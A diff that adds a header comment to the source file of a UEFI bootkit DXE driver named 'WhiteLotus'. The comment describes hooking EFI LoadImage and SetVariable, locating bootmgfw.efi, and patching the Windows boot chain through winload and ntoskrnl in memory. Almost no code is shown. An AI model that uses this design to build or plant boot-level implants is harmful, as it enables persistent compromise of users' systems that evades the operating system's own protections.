@@ -1,3 +1,30 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : WhiteLotus.c
+ * ============================================================
+ *
+ *  Description:
+ *    Main DXE Driver entry point. Hooks EFI Boot Services
+ *    (LoadImage and SetVariable), dynamically searches all
+ *    mounted partitions for bootmgfw.efi, and loads the
+ *    Windows Boot Manager with in-memory patches applied.
+ *    Also registers ExitBootServices and VirtualAddressMap
+ *    events to maintain hook state through the boot handoff.
+ *
+ *  Purpose:
+ *    - Hook EFI Boot Services at runtime to intercept the
+ *      loading of bootmgfw.efi before execution.
+ *    - Chain the full boot-time patch pipeline:
+ *      bootmgfw -> winload -> ntoskrnl.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "WhiteLotus.h"
 
 STATIC EFI_IMAGE_LOAD OriginalLoadImageAddress = NULL;
